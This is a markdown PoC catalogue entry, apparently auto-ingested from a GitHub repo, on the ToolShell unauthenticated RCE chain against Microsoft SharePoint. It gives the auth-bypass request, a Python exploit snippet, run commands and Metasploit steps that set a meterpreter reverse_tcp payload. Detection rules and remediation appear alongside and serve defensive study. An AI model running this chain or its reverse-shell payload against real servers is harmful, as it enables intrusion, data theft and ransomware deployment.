@@ -1,0 +1,181 @@
+
+<!-- 
+  File: 2026-05-17_toolshell-sharepoint-chain.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2025-09-04 |
+| **Author / Researcher** | saladin0x1 (Metasploit ref: Viettel Cyber Security / sfewer-r7) |
+| **CVE / Advisory** | CVE-2025-53770, CVE-2025-53771, CVE-2025-49704, CVE-2025-49706 |
+| **Category** | web |
+| **Severity** | Critical |
+| **CVSS Score** | N/A (Critical per MSRC) |
+| **Status** | Weaponized |
+| **Tags** | RCE, SharePoint, unauthenticated, deserialization, auth-bypass, APT27, APT31, ransomware, Windows, IIS |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Microsoft SharePoint Server |
+| **Versions Affected** | SharePoint Server 2019 (16.0.10337.12109 through 16.0.10417.20027); SharePoint Subscription Edition (16.0.14326.20450 through 16.0.18526.20424); SharePoint 2016 (16.0.4351.1000 through 16.0.5508.1000) |
+| **Language / Platform** | .NET / Windows, ASP.NET WebForms |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2025-53770 ("ToolShell") is a full unauthenticated remote code execution chain against Microsoft SharePoint Server. The chain combines an authentication bypass in the ToolPane.aspx endpoint (CVE-2025-49706 / patch bypass CVE-2025-53771) with an unsafe .NET deserialization vulnerability in the ExcelDataSet control (CVE-2025-49704 / patch bypass CVE-2025-53770). An unauthenticated attacker with network access to a SharePoint server can achieve RCE as the SharePoint application pool identity (IIS worker process). The vulnerability has been actively exploited in the wild by China-nexus APT groups Linen Typhoon (APT27) and Violet Typhoon (APT31) as well as the ransomware group Storm-2603.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+The chain has two components. First, the ToolPane.aspx page can be reached without authentication when a crafted query string (`DisplayMode=Edit` + a dummy parameter with value `/ToolPane.aspx`) and a `Referer` header pointing to `/_layouts/SignOut.aspx` are supplied — this is the CVE-2025-49706 auth bypass, with CVE-2025-53771 being a patch bypass that appends an additional path segment to the URL. Second, the `MSOTlPn_DWP` POST parameter accepts arbitrary ASP.NET user-control markup, including the `Microsoft.PerformancePoint.Scorecards.ExcelDataSet` control, which deserializes a gzip+base64-encoded .NET `DataSet` from its `CompressedDataTable` attribute. The `DataSet` deserialization path (CVE-2025-49704) permits a `msdata:DataType` attribute that instantiates `LosFormatter` and `ObjectDataProvider`, enabling a two-stage gadget chain: outer `DataSet` -> inner `TypeConfuseDelegate + LosFormatter` -> arbitrary command execution. CVE-2025-53770 is a patch bypass targeting a different endpoint within `/_vti_bin/`.
+
+### Attack Vector
+
+Unauthenticated HTTP POST to `/_layouts/15/ToolPane.aspx/<random>?DisplayMode=Edit&<random>=/ToolPane.aspx` with the `Referer` header set to `/_layouts/SignOut.aspx` and the `MSOTlPn_DWP` body parameter containing the crafted ExcelDataSet control XML with the deserialization payload embedded in the `CompressedDataTable` attribute.
+
+### Impact
+
+Unauthenticated Remote Code Execution as the IIS application pool identity running SharePoint (typically `NT AUTHORITY\IUSR` or a domain service account). Full code execution enables lateral movement, data exfiltration, ransomware deployment, and persistence.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Windows Server 2019
+Target:      SharePoint Server 2019 (16.0.10337.12109 RTM or 16.0.10417.20018 June 2025 patch)
+Attacker:    Kali Linux / any system with Python 3 + requests
+Tools:       Python 3, requests, urllib3; Metasploit Framework (for .rb module)
+```
+
+### Setup Steps
+
+```bash
+pip install requests urllib3
+
+python scanner/scanner.py http://<sharepoint-host>
+
+python exploit/exploit.py <sharepoint-host-or-ip>
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Scan for vulnerability** - Identify patch level via `siteClientTag`
+   ```bash
+   python scanner/scanner.py http://192.168.1.100
+   ```
+
+2. **Send exploit payload** - POST crafted DWP markup triggering deserialization
+   ```bash
+   python exploit/exploit.py 192.168.1.100
+   ```
+
+3. **Metasploit module** - Full shell via TypeConfuseDelegate + LosFormatter chain
+   ```bash
+   use exploit/windows/http/sharepoint_toolpane_rce
+   set RHOSTS 192.168.1.100
+   set PAYLOAD cmd/windows/http/x64/meterpreter/reverse_tcp
+   run
+   ```
+
+### Exploit Code
+
+> See `exploit/exploit.py`, `scanner/scanner.py`, `analysis/analyse.py`, and `metasploit_ref/sharepoint_toolpane_rce.rb` in this folder.
+
+```python
+url = f"http://{target}/_layouts/15/ToolPane.aspx/x?DisplayMode=Edit&y=/ToolPane.aspx"
+headers = {'Referer': '/_layouts/SignOut.aspx', 'Content-Type': 'application/x-www-form-urlencoded'}
+data = "MSOTlPn_Uri=...&MSOTlPn_DWP=<ExcelDataSet CompressedDataTable='<gadget>' runat='server'/>"
+requests.post(url, headers=headers, data=data, verify=False)
+```
+
+### Expected Output
+
+```
+[+] Targeting: http://192.168.1.100
+[+] Sending exploit payload...
+[+] Response Status: 200
+[+] Response Length: 1234 bytes
+[+] Request completed successfully
+```
+
+---
+
+## Screenshots / Evidence
+
+<!-- Add paths to screenshots or embed them -->
+- No screenshots included in upstream repo.
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+POST /_layouts/15/ToolPane.aspx/* ?DisplayMode=Edit
+Referer: /_layouts/SignOut.aspx
+Content-Type: application/x-www-form-urlencoded
+Body contains: MSOTlPn_DWP, ExcelDataSet, CompressedDataTable
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> any 80 (msg:"ToolShell SharePoint RCE Attempt CVE-2025-49706"; content:"POST"; http_method; content:"/ToolPane.aspx"; http_uri; content:"DisplayMode=Edit"; http_uri; content:"SignOut.aspx"; http_header; content:"MSOTlPn_DWP"; http_client_body; sid:9000010;)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Apply Microsoft security update addressing CVE-2025-53770 and CVE-2025-53771 (August 2025 CU or later for SharePoint 2019). Check MSRC advisories for exact build numbers. |
+| **Workaround** | Perform the manual SharePoint configuration update described in https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/ — patching alone is insufficient without the config update. |
+| **Config Hardening** | Restrict inbound access to SharePoint `/_layouts/` paths at the network perimeter; enable extended protection for authentication on IIS; block external access to SharePoint admin endpoints. |
+
+---
+
+## References
+
+- [CVE-2025-53770 (MSRC)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770)
+- [CVE-2025-53771 (MSRC)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53771)
+- [CVE-2025-49704 (MSRC)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49704)
+- [CVE-2025-49706 (MSRC)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49706)
+- [Viettel Cyber Security - ToolShell Technical Analysis](https://blog.viettelcybersecurity.com/sharepoint-toolshell/)
+- [Kaspersky - ToolShell Explained](https://securelist.com/toolshell-explained/)
+- [LeakIX - In-the-wild exploit capture](https://blog.leakix.net/2025/07/using-their-own-weapons-for-defense-a-sharepoint-story/)
+- [Microsoft Security Blog - Disrupting active exploitation](https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/)
+- [Microsoft Customer Guidance](https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/)
+- [ZDI-25-580](https://www.zerodayinitiative.com/advisories/ZDI-25-580/)
+- [ZDI-25-581](https://www.zerodayinitiative.com/advisories/ZDI-25-581/)
+- [Source repo: https://github.com/saladin0x1/CVE-2025-53770](https://github.com/saladin0x1/CVE-2025-53770)
+
+---
+
+## Notes
+
+Actively exploited in the wild as a zero-day since at least July 19, 2025. Attributed to China-nexus APT groups Linen Typhoon (APT27) and Violet Typhoon (APT31) and the ransomware operator Storm-2603. The CVE-2025-53770 designation is a patch bypass of CVE-2025-49704 targeting a different `/_vti_bin/` endpoint; the Metasploit module (included here) exploits the ToolPane endpoint chain (CVE-2025-49704 + CVE-2025-49706). The July 2025 patch alone is insufficient — a manual SharePoint configuration update must also be applied. Repo contains Python exploit, scanner, payload analyser, and a full Metasploit module with the DataSet + TypeConfuseDelegate + LosFormatter gadget chain. Stars: 4. Language: Ruby (primary), Python.
+
+Auto-ingested from https://github.com/saladin0x1/CVE-2025-53770 on 2026-05-17.
+
